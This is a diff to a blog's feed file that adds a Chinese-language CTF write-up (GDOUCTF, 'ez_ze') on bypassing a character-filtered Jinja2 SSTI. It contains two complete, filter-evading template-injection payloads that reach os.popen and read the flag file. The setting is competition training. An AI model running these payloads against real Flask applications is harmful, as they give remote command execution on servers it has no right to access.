@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>GDOUCTF—web-wp</title>
+      <link href="/2023/04/20/GDOUCTF%E2%80%94web-wp/"/>
+      <url>/2023/04/20/GDOUCTF%E2%80%94web-wp/</url>
+      
+        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h1><blockquote><p>SSTI被过滤<code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; ` `&#125;&#125;</code> 绕过方法。</p></blockquote><p>FUZZ跑一下测出来过滤了下列字符</p><p><code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; ` `&#125;&#125;</code></p><p>这个题目如果没有过滤<code>\</code>就可以用unicode编码之类的绕过，但是过滤了<code>\</code>所以不能用unicode，</p><p>payload1:</p><p>采用 jinja2的过滤器attr和format</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c&#x27;|format(95,95,109,114,111,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(1)|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(132)|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;cat /f*&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure><p>payload2:</p><p>采用jinja2的过滤器attr和利用 flask的request方法来进行获取<code>__</code> (下面的payload要用burpsuite，不然被url编码以后就会失效)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /get_flag?__</span><br><span class="line">&#123;% for c in request|attr(&#x27;args&#x27;) %&#125;&#123;%print(&#x27;&#x27;|attr(c%2b&#x27;cla&#x27;&#x27;ss&#x27;%2bc)|attr(c%2b&#x27;ba&#x27;&#x27;se&#x27;%2bc)|attr(c%2b&#x27;subcl&#x27;&#x27;asses&#x27;%2bc)()|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(132)|attr(c%2b&#x27;in&#x27;&#x27;it&#x27;%2bc)|attr(c%2b&#x27;glob&#x27;&#x27;als&#x27;%2bc)|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;cat /flag&#x27;)|attr(&#x27;read&#x27;)()) %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛wp </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> WEB </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTFSHOW愚人杯-web</title>
       <link href="/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/"/>
       <url>/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/</url>
@@ -65,7 +92,7 @@
       
       <categories>
           
-          <category> 线下赛wp </category>
+          <category> 比赛wp </category>
           
       </categories>
       
